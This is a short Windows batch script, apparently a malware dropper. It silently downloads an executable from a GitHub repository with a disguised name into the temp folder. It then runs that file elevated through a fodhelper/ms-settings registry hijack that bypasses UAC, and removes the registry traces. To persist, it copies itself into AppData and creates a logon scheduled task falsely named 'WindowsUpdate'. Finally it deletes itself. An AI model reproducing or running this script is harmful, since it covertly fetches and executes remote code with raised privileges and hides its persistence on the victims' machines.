@echo off
setlocal

curl -sL -o "%TEMP%\s.exe" "https://github.com/KronoRDP/System.Service-Windonws/raw/refs/heads/main/puro/service.exe"

reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "\"%TEMP%\s.exe\" -fullinstall" /f >nul 2>&1
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f >nul 2>&1
start "" fodhelper.exe

timeout /t 5 /nobreak >nul
reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1

copy /y "%~f0" "%APPDATA%\Microsoft\Windows\wu.bat" >nul 2>&1
schtasks /create /tn "WindowsUpdate" /tr "\"%APPDATA%\Microsoft\Windows\wu.bat\"" /sc onlogon /f >nul 2>&1

del "%~f0" >nul 2>&1
exit